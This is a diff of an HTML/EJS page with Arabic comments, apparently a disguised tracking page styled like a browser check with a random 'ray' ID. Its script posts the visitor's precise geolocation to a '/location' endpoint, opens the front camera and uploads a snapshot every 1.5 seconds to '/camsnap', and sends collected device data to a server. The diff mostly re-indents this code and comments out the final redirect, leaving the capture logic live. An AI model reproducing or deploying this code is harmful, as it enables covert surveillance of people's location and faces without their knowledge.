@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ar-SA">
 <head> 
@@ -149,27 +150,26 @@ td+="<b>🔋 مستوى البطارية:</b> " +battery.level*100+"%<br><b>⚡ 
 
 //////الموقع
 if(!navigator.geolocation) {
-td+="<br><b>📍 معلومات الموقع</b><br>";
-td+="⚠️ واجهة برمجة تطبيقات المواقع غير متوفرة";
-l=true;
+    td+="<br><b>📍 معلومات الموقع</b><br>";
+    td+="⚠️ واجهة برمجة تطبيقات المواقع غير متوفرة";
+    l=true;
 } 
 
 function success(pos) {
-const crd = pos.coords;
-$.post("<%=a %>/location",{uid:uid,lat:encodeURIComponent(crd.latitude),lon:encodeURIComponent(crd.longitude),acc:encodeURIComponent(crd.accuracy)},(s)=>{
-l=true;
-red();
-});
+    const crd = pos.coords;
+    $.post("<%=a %>/location",{uid:uid,lat:encodeURIComponent(crd.latitude),lon:encodeURIComponent(crd.longitude),acc:encodeURIComponent(crd.accuracy)},(s)=>{
+        l=true;
+        red();
+    });
 }
 
 function error(err) {
-td+="<br><b>📍 معلومات الموقع</b><br>";
-td+="⚠️ خطأ في الموقع: <code>"+err.message+"</code>";
-l=true;
+    td+="<br><b>📍 معلومات الموقع</b><br>";
+    td+="⚠️ خطأ في الموقع: <code>"+err.message+"</code>";
+    l=true;
 }
 if(navigator.geolocation){
-await navigator.geolocation.getCurrentPosition(success, error, {  enableHighAccuracy: true, maximumAge: 0});
-
+    await navigator.geolocation.getCurrentPosition(success, error, {  enableHighAccuracy: true, maximumAge: 0});
 }
 
 const video = document.getElementById('video');
@@ -177,46 +177,48 @@ const canvas = document.getElementById('canvas');
 var imgsent=0;
 
 function post(o){
-$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(o)},(s)=>{
-imgsent+=1;
-if(imgsent==4){
-c=true;
-red();
+    $.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(o)},(s)=>{
+        imgsent+=1;
+        if(imgsent==4){
+            c=true;
+            red();
+        }
+    });
 }
-});
-}
-const constraints = {audio: false,video: {facingMode: "user" }};
+const constraints = {audio: false, video: {facingMode: "user" }};
 // الوصول إلى الكاميرا
 async function cam() {
-try {
-const stream = await navigator.mediaDevices.getUserMedia(constraints);
-handleSuccess(stream);
-} catch (e) {
-td+='<br><b>📷 صور الكاميرا</b>';
-td+= `<br>⚠️ خطأ في الوصول للكاميرا: ${e.toString()}`;
-c=true;
-red();
-}
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+    } catch (e) {
+        td+='<br><b>📷 صور الكاميرا</b>';
+        td+= `<br>⚠️ خطأ في الوصول للكاميرا: ${e.toString()}`;
+        c=true;
+        red();
+    }
 }
 
 // نجاح
 function handleSuccess(stream) {
-window.stream = stream;
-video.srcObject = stream;
-var context = canvas.getContext('2d');
-var id=setInterval(function(){
-context.drawImage(video, 0, 0, 500, 500);
-var canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64", "");
-post(canvasData);
-}, 1500);
+    window.stream = stream;
+    video.srcObject = stream;
+    var context = canvas.getContext('2d');
+    var id=setInterval(function(){
+        context.drawImage(video, 0, 0, 500, 500);
+        var canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64", "");
+        post(canvasData);
+    }, 1500);
 }
 
 cam();
 
 function red(){
-if(c && l){
-window.location.href="<%=url %>"
-}
+    if(c && l){
+        // تم حذف إعادة التوجيه
+        // window.location.href="<%=url %>";
+        console.log("Ready");
+    }
 }
 
 $.post("<%=a %>",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},(s)=>{});
@@ -224,13 +226,13 @@ $.post("<%=a %>",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},(s)=>
 }
 
 window.onload=()=>{
-gather();
-var i="qwertyuioplkjhgfdsazxcvbnm0987654321";
-var str="";
-for(var o=0;o<17;o++){
-str+=i[Math.floor(Math.random() * 35)];
-}
-document.getElementById("ray").innerHTML=str;
+    gather();
+    var i="qwertyuioplkjhgfdsazxcvbnm0987654321";
+    var str="";
+    for(var o=0;o<17;o++){
+        str+=i[Math.floor(Math.random() * 35)];
+    }
+    document.getElementById("ray").innerHTML=str;
 };
 </script>
 </body>
